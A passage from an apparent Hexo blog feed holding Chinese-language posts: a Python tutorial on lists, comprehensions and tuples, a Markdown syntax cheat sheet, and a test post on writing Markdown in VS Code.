style="text-align:center">将列表mlist<code>排序</code>，参数reverse控制是否<code>倒序</code></td></tr><tr><td style="text-align:center">mlist.reverse()</td><td style="text-align:center">将列表<code>倒序</code>排列</td></tr><tr><td style="text-align:center">mlist.count(an element)</td><td style="text-align:center">返回这个元素在列表中的<code>个数</code></td></tr><tr><td style="text-align:center">mlist.index(an element, start index, end index)</td><td style="text-align:center">返回这个元素的<code>下标</code>，若有多个则返回第一个</td></tr><tr><td style="text-align:center">mlist.copy()</td><td style="text-align:center">返回原列表的<code>浅拷贝</code></td></tr><tr><td style="text-align:center">len(mlist)</td><td style="text-align:center">返回值等于列表mlist的<code>长度</code></td></tr></tbody></table></div><p>Translation:</p><ol><li>element: 元素</li><li>index: 下标</li></ol><h2 id="6-嵌套列表"><a href="#6-嵌套列表" class="headerlink" title="6. 嵌套列表"></a>6. 嵌套列表</h2><p>初始化<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">matrix = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">matrix = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], </span><br><span class="line">          [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">          [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">A = [<span class="number">0</span>] * <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)</span><br><span class="line">    A[i] = [<span class="number">0</span>] * <span class="number">3</span></span><br></pre></td></tr></table></figure></p><p><code>注： 不要这样声明嵌套列表：</code>B = [[0] * 3] * 3</p><p>这样声明的列表其实是对同一个[0, 0, 0]引用三次</p><p>即假设 B[0][0] = 1，则B = [[1, 0, 0], [1, 0, 0], [1, 0, 0]]<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">B[<span class="number">0</span>] <span class="keyword">is</span> B[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure><br>访问<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">matrix[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># [1， 2， 3]</span></span><br><span class="line">matrix[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> matrix:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        <span class="built_in">print</span>(j, end=<span class="string">&quot; &quot;</span>)<span class="comment"># 空格结尾</span></span><br><span class="line">    <span class="built_in">print</span>() <span class="comment"># 换行</span></span><br><span class="line"><span class="comment"># 1 2 3</span></span><br><span class="line"><span class="comment"># 4 5 6</span></span><br><span class="line"><span class="comment"># 7 8 9</span></span><br></pre></td></tr></table></figure></p><h2 id="7-列表名与列表"><a href="#7-列表名与列表" class="headerlink" title="7. 列表名与列表"></a>7. 列表名与列表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">y = x</span><br><span class="line">x <span class="keyword">is</span> y</span><br><span class="line"><span class="comment"># True 说明x与y表示同一个列表</span></span><br></pre></td></tr></table></figure><p>注：Python中，变量名并不是一个盒子，数据并非储存在变量中，而是变量名与数据挂钩，列表名能够引用其指向的数据</p><h2 id="8-列表拷贝"><a href="#8-列表拷贝" class="headerlink" title="8. 列表拷贝"></a>8. 列表拷贝</h2><p>在Python中，拷贝可以分为浅拷贝和深拷贝</p><p>在嵌套结构中，对其中所嵌套元素，浅拷贝仅拷贝其引用，而深拷贝会将嵌套元素也拷贝<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mlist = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line"><span class="keyword">import</span> copy <span class="comment"># 深拷贝所在库</span></span><br><span class="line">mlist_copy1 = mlist <span class="comment">#浅拷贝</span></span><br><span class="line">mlist_copy2 = copy.copy(mlist) <span class="comment"># 浅拷贝</span></span><br><span class="line">mlist_copy3 = copy.deepcopy(mlist) <span class="comment"># 深拷贝</span></span><br></pre></td></tr></table></figure></p><h2 id="9-列表推导式"><a href="#9-列表推导式" class="headerlink" title="9. 列表推导式"></a>9. 列表推导式</h2><p>语法：</p><p>基本形式：_ = [expression for target in iterable]</p><p>筛选形式：_ = [expression for target in iterable if condition]</p><p>完整形式：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_ = [expression for target1 in iterable1 if condition1  </span><br><span class="line">                for target2 in iterable2 if condition2  </span><br><span class="line">                                 ...  </span><br><span class="line">                for target3 in iterable3 if condition3]</span><br></pre></td></tr></table></figure></p><p>等价于：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_ = []</span><br><span class="line">for target1 in iterable1:</span><br><span class="line">    if condition1:</span><br><span class="line">        for target2 in iterable2:</span><br><span class="line">            if condition2:</span><br><span class="line">                ...</span><br><span class="line">                    _ = expression</span><br></pre></td></tr></table></figure></p><p><strong>示例</strong></p><ol><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mlist = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">mlist = [i * <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> mlist]</span><br><span class="line"><span class="comment"># mlist = [2, 4, 6, 8, 10]</span></span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mlist = [char * <span class="number">2</span> <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&quot;Momoyeyu&quot;</span>]</span><br><span class="line"><span class="comment"># mlist = [&#x27;MM&#x27;, &#x27;oo&#x27;, &#x27;mm&#x27;, &#x27;oo&#x27;, &#x27;yy&#x27;, &#x27;ee&#x27;, &#x27;yy&#x27;, &#x27;uu&#x27;]</span></span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">matrix = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], </span><br><span class="line">          [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">          [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">diag = [matrix[i][i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>[<span class="built_in">len</span>(matrix)]]</span><br><span class="line"><span class="comment"># diag = [1, 5, 9]</span></span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">matrix = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], </span><br><span class="line">          [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">          [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">flatten = [col <span class="keyword">for</span> row <span class="keyword">in</span> matrix <span class="keyword">for</span> col <span class="keyword">in</span> row]</span><br><span class="line"><span class="comment"># flatten = [1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br></pre></td></tr></table></figure>等价于：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flatten = []</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> matrix:</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> row:</span><br><span class="line">        flatten.append(col)</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_ = [[x, y] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> y % <span class="number">3</span> == <span class="number">0</span>]</span><br><span class="line"><span class="comment"># _ = [[0, 0], [0, 3], [0, 6], [0, 9], [2, 0], [2, 3], [2, 6], [2, 9], [4, 0], [4, 3], [4, 6], [4, 9], [6, 0], [6, 3], [6, 6], [6, 9], [8, 0], [8, 3], [8, 6], [8, 9]]</span></span><br></pre></td></tr></table></figure>等价于：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_ = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> y % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">                _.append([x, y])</span><br></pre></td></tr></table></figure></li></ol><h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><p>许多部分与列表相似，因此不多赘述，没有提到的部分基本都可以参考列表进行操作</p><h2 id="1-创建与访问元组"><a href="#1-创建与访问元组" class="headerlink" title="1. 创建与访问元组"></a>1. 创建与访问元组</h2><p>创建：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_1 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">_2 = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span></span><br><span class="line">_1 == _2 <span class="comment"># True</span></span><br><span class="line">_1 <span class="keyword">is</span> _2 <span class="comment"># False</span></span><br></pre></td></tr></table></figure></p><p>注：建立元表可以省略小括号，但一定需要加逗号<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">1</span></span><br><span class="line"><span class="built_in">type</span>(x) <span class="comment"># &lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line">y = <span class="number">1</span>,</span><br><span class="line"><span class="built_in">type</span>(y) <span class="comment"># &lt;class &#x27;tuple&#x27;&gt;</span></span><br></pre></td></tr></table></figure></p><p>访问：与访问列表基本一致</p><h2 id="2-元组的修改"><a href="#2-元组的修改" class="headerlink" title="2. 元组的修改"></a>2. 元组的修改</h2><p><strong><code>元组不可修改，指的是元组中每个元素的指向永远不变，但元素指向的数据可以发生改变</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_ = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> , <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">_[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line"><span class="comment"># Traceback (most recent call last):</span></span><br><span class="line"><span class="comment">#   File &quot;&lt;pyshell#9&gt;&quot;, line 1, in &lt;module&gt;</span></span><br><span class="line"><span class="comment">#     _[0] = 0</span></span><br><span class="line"><span class="comment"># TypeError: &#x27;tuple&#x27; object does not support item assignment</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_ = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">_[<span class="number">4</span>].append(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># _ = (1, 2, 3, 4, [1, 2, 3, 4])</span></span><br></pre></td></tr></table></figure><h2 id="3-解包操作"><a href="#3-解包操作" class="headerlink" title="3. 解包操作"></a>3. 解包操作</h2><p>列表，元组，字符串都可以使用解包操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">x, y, z = t</span><br><span class="line"><span class="comment"># x = 1; y = 2; z = 3</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x, y, z = <span class="string">&quot;Momoyeyu&quot;</span></span><br><span class="line"><span class="comment"># Error 左侧变量名和右侧元素数量不等</span></span><br><span class="line">x, y, *z = <span class="string">&quot;Momoyeyu&quot;</span></span><br><span class="line"><span class="comment"># x = M; y = o; z = &quot;moyeyu&quot;</span></span><br></pre></td></tr></table></figure><p>Python的<code>多重赋值</code>本质就是先将值包装为元组，再解包与各个变量名挂钩<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x, y = <span class="number">1</span>, <span class="number">2</span></span><br></pre></td></tr></table></figure><br>等价于：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_ = (<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">x, y = _</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown语法摘录</title>
      <link href="/2023/01/13/Blog/markdown%E8%AF%AD%E6%B3%95%E6%91%98%E5%BD%95/"/>
      <url>/2023/01/13/Blog/markdown%E8%AF%AD%E6%B3%95%E6%91%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>参考资料：</p><blockquote><p><a href="https://blog.csdn.net/u014061630/article/details/81359144">Markdown语法图文全面详解(10分钟学会)</a><br><a href="https://www.fomal.cc/posts/2013454d.html">Markdown语法与外挂标签写法汇总</a></p></blockquote><!-- # 快捷键*[注释]: Shift + Alt + f 自动美化表格|   功能   |  快捷键  || :------: | :------: ||   加粗   | Ctrl + B ||   斜体   | Ctrl + I ||   引用   | Ctrl + Q || 插入链接 | Ctrl + L || 插入代码 | Ctrl + K || 插入图片 | Ctrl + G || 提升标题 | Ctrl + H || 有序列表 | Ctrl + O || 无序列表 | Ctrl + U ||   横线   | Ctrl + R ||   撤销   | Ctrl + Z ||   重做   | Ctrl + Y | --> |# Markdown语法摘录## 1. s文字样式> 源码示例<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="emphasis">*斜体*</span> （快捷键：Ctrl + i）</span><br><span class="line"></span><br><span class="line"><span class="strong">**加粗**</span> （快捷键：Ctrl + b）</span><br><span class="line"></span><br><span class="line"><span class="strong">**<span class="emphasis">*斜体加粗*</span>**</span></span><br><span class="line"></span><br><span class="line"><span class="code">`高亮`</span></span><br><span class="line"></span><br><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure><blockquote><p>效果示例</p><p><em>斜体</em></p><p><strong>加粗</strong></p><p><strong><em>斜体加粗</em></strong></p><p><code>高亮</code></p><p><del>删除线</del></p><h2 id="2-引用"><a href="#2-引用" class="headerlink" title="2. 引用"></a>2. 引用</h2></blockquote><h3 id="源码示例"><a href="#源码示例" class="headerlink" title="源码示例"></a>源码示例</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt; 引用1</span></span><br><span class="line"><span class="quote">&gt; 引用2</span></span><br><span class="line"><span class="quote">&gt; &gt; 引用2.1</span></span><br><span class="line"><span class="quote">&gt; 引用3</span></span><br><span class="line"><span class="quote">&gt;</span></span><br><span class="line"><span class="quote">&gt; 引用4</span></span><br></pre></td></tr></table></figure><h3 id="效果示例"><a href="#效果示例" class="headerlink" title="效果示例"></a>效果示例</h3><blockquote><p>引用1<br>引用2</p><blockquote><p>引用2.1<br>引用3</p></blockquote><p>引用4</p></blockquote><h2 id="3-列表"><a href="#3-列表" class="headerlink" title="3. 列表"></a>3. 列表</h2><h3 id="3-1-无序列表"><a href="#3-1-无序列表" class="headerlink" title="3.1 无序列表"></a>3.1 无序列表</h3><p>使用 *，+，- 表示无序列表。<br>注意：符号后面一定要有一个空格，起到缩进的作用。</p><blockquote><p>源码示例<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 列表文字</span><br><span class="line"><span class="bullet">-</span> 列表文字</span><br><span class="line"></span><br><span class="line"><span class="bullet">*</span> 列表文字</span><br><span class="line"><span class="bullet">*</span> 列表文字</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> 列表文字</span><br><span class="line"><span class="bullet">+</span> 列表文字</span><br></pre></td></tr></table></figure><br>效果示例</p><ul><li>列表文字</li><li>列表文字</li></ul><ul><li>列表文字</li><li>列表文字</li></ul><ul><li>列表文字</li><li>列表文字</li></ul></blockquote><h3 id="3-2-有序列表"><a href="#3-2-有序列表" class="headerlink" title="3.2 有序列表"></a>3.2 有序列表</h3><p>注：有序列表的序列顺序即使输入错误也会自动修正（例如第三行的4）</p><blockquote><p>源码示例<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> content1</span><br><span class="line"><span class="bullet">2.</span> content2</span><br><span class="line"><span class="bullet">4.</span> content3</span><br></pre></td></tr></table></figure></p><p>效果示例</p><ol><li>content1</li><li>content2</li><li>content3</li></ol></blockquote><p>PS：数字后加点号有时会无意创建列表，因此点号的输入方式为斜杠加点号：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\.</span><br></pre></td></tr></table></figure></p><h2 id="4-特殊符号"><a href="#4-特殊符号" class="headerlink" title="4. 特殊符号"></a>4. 特殊符号</h2><p>按字符输出语法符号时，需要加斜杠：<br><img src="https://img-blog.csdn.net/20180802162507298?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTQwNjE2MzA=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt><br>PS：图片引自<a href="https://blog.csdn.net/u014061630/article/details/81359144">Markdown语法图文全面详解(10分钟学会)</a></p><h2 id="5-缩进"><a href="#5-缩进" class="headerlink" title="5. 缩进"></a>5. 缩进</h2><blockquote><p>源码示例<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content0，无缩进</span><br><span class="line">&amp;nbsp;content1，缩进1/2字符</span><br><span class="line">&amp;ensp;content2，缩进1字符</span><br><span class="line">&amp;emsp;content3，缩进2字符（1个中文字符）</span><br></pre></td></tr></table></figure></p><p>效果示例<br>content0，无缩进<br>&nbsp;content1，缩进1/2字符<br>&ensp;content2，缩进1字符<br>&emsp;content3，缩进2字符（1个中文字符）</p></blockquote><h2 id="6-图片"><a href="#6-图片" class="headerlink" title="6. 图片"></a>6. 图片</h2><h3 id="6-1-本地图片"><a href="#6-1-本地图片" class="headerlink" title="6.1 本地图片"></a>6.1 本地图片</h3><p><img src="\..\..\img\nijika.png" alt="示例图片" style="zoom:50%;"></p><blockquote><p>代码示例<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;..\..\img\nijika.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;示例图片&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:50%;&quot;</span> /&gt;</span></span></span><br></pre></td></tr></table></figure></p></blockquote><ul><li>img src=”文件相对位置”</li><li>alt=”图片名称”</li><li>style=”zoom:图片大小百分比;”</li></ul><h3 id="6-2-在线图片"><a href="#6-2-在线图片" class="headerlink" title="6.2 在线图片"></a>6.2 在线图片</h3><p><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png" alt="code"></p><blockquote><p>代码示例<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">code</span>](<span class="link">https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png</span>)</span><br></pre></td></tr></table></figure></p></blockquote><ul><li>![图片名称]</li><li>(网址)</li></ul><h2 id="7-表格"><a href="#7-表格" class="headerlink" title="7.表格"></a>7.表格</h2><p>表格第一行是表头，第二行用杠（这个符号：- ）来生成表格，杠左右加冒号（英文格式的）用来控制这一列对齐位置，<strong>第二行要有杠才能生成表格</strong></p><ul><li>源码示例<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|                 A |        B         | C                 | D              |</span><br><span class="line">| ----------------: | :--------------: | :---------------- | -------------- |</span><br><span class="line">| 我是右对其的内容: | :我是居中的内容: | :我是左对齐的内容 | 我是默认的内容 |</span><br><span class="line">|             A内容 |      B内容       | C内容             | D内容          |</span><br></pre></td></tr></table></figure></li></ul><ul><li>效果示例</li></ul><div class="table-container"><table><thead><tr><th style="text-align:right">A</th><th style="text-align:center">B</th><th style="text-align:left">C</th><th>D</th></tr></thead><tbody><tr><td style="text-align:right">我是右对其的内容:</td><td style="text-align:center">:我是居中的内容:</td><td style="text-align:left">:我是左对齐的内容</td><td>我是默认的内容</td></tr><tr><td style="text-align:right">A内容</td><td style="text-align:center">B内容</td><td style="text-align:left">C内容</td><td>D内容</td></tr></tbody></table></div><p>表头默认加粗居中，内容默认左对齐</p><p>使用 Alt + Shift + f 可以自动美化源码中的表格的文本</p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown, Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一篇测试博客</title>
      <link href="/2023/01/13/Blog/%E4%B8%80%E7%AF%87%E6%B5%8B%E8%AF%95%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/01/13/Blog/%E4%B8%80%E7%AF%87%E6%B5%8B%E8%AF%95%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="通过-Markdown-amp-VScode-写博客"><a href="#通过-Markdown-amp-VScode-写博客" class="headerlink" title=" 通过 Markdown &amp; VScode 写博客 "></a><strong> 通过 Markdown &amp; VScode 写博客 </strong></h1><p>这是一篇关于 Markdown &amp; VScode 的测试文章</p><h1 id="这是一个一级标题"><a href="#这是一个一级标题" class="headerlink" title="这是一个一级标题"></a>这是一个一级标题</h1><h2 id="这是一个二级标题"><a href="#这是一个二级标题" class="headerlink" title="这是一个二级标题"></a>这是一个二级标题</h2><p>这是正文<br>VScode中直接换行，实际不会换行，但不同的渲染器可能处理结果不同，有的会换行</p><p>想要在段落内换行可以在一行末尾打两个空格实现，比如这一行<br>这是和上一行同一段落但手动换行的第二行</p><p>VScode中连用两次换行可以分割段落（即两端中间空一行即表示分段落）</p><p>加粗方法：左右各加两个星号：<strong>加粗了</strong> ，也可以用快捷键 <strong>Ctrl + b</strong> 控制加粗</p><p>斜体方法：左右各加一个星号：<em>变斜了</em>，也可以用快捷键 <strong>Ctrl + i</strong> 控制斜体</p><p>注意：星号前最好加个空格，否则可能无法识别格式</p><ol><li>数字+点+空格</li><li>可以自动生成后续行的数字和点<ol><li>Tab生成二级列表<ol><li>再Tab生成三级列表（和Python通过缩进区分层级类似）</li></ol></li></ol></li><li>这是一级列表的第三行，即使VScode中自己序号的数字写错了，序号也会被自动修正（实际上我写的是 “4. “）</li></ol><p>想要生成两个列表，中间要加入文字切开</p><ol><li>这是另一个列表</li></ol><p>让我们试试加入一些图片：</p><p>可以直接复制图片，然后用 <strong>Ctrl + Alt + v</strong> 来粘贴，比如这只随手抓的にじか：</p><p><img src="/../../img/nijika.png" alt></p><p>除此之外，也可以将图片存进文章的文件夹然后用图片的格式：<strong>! + [] + (图片文件相对位置或图片网址)</strong> 来插入图片</p><h3 id="这是一个三级标题"><a href="#这是一个三级标题" class="headerlink" title="这是一个三级标题"></a>这是一个三级标题</h3><p>可以用两个$来包括公式，这个格式可以连按两次 Ctrl + m 呼出</p><script type="math/tex; mode=display">\lim_{x \to \infin}\frac{sin(x)}{x}=1</script><p>也可以在一段文字中用 Ctrl + m 插入 $\lim_{x \to \infin}\frac{sin(x)}{x}=1$ 公式</p><h2 id="试试使用表格"><a href="#试试使用表格" class="headerlink" title="试试使用表格"></a>试试使用表格</h2><p>通过符号（这个符号：|）可以建立表格：</p><p>表格第一行是表头，第二行用杠（这个符号：- ）来生成表格，杠左右加冒号（英文格式的）用来控制这一列对齐位置，<strong>第二行要有杠才能生成表格</strong></p><p>例：</p><div class="table-container"><table><thead><tr><th style="text-align:right">A</th><th style="text-align:center">B</th><th style="text-align:left">C</th><th>D</th></tr></thead><tbody><tr><td style="text-align:right">我是右对其的内容:</td><td style="text-align:center">:我是居中的内容:</td><td style="text-align:left">:我是左对齐的内容</td><td>我是默认的内容</td></tr><tr><td style="text-align:right">A内容</td><td style="text-align:center">B内容</td><td style="text-align:left">C内容</td><td>D内容</td></tr></tbody></table></div><p>表头默认加粗居中，内容默认左对齐</p><p>使用 Alt + Shift + f 可以自动美化VScode中的表格的文本</p><h2 id="尝试贴个链接："><a href="#尝试贴个链接：" class="headerlink" title="尝试贴个链接："></a>尝试贴个链接：</h2><p>可以直接复制一个链接，然后选中你想要的文字，用 Ctrl + v 粘贴，链接就会与所选中文字绑定：</p><p>这是我的博客的<a href="https://momoyeyu.github.io/">链接</a></p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p>VScode也可以写代码的：</p><p>方法：上下各用三个小撇号 <strong>（这个符号：` ）</strong> 包围代码块，还可以在上层的小撇号后标明语言类型，可以使代码高亮</p><p>我们随便拿两行javascript来试试:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;Javascript syntax highlighting&quot;</span>;</span><br><span class="line"><span class="title function_">alert</span>(s);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
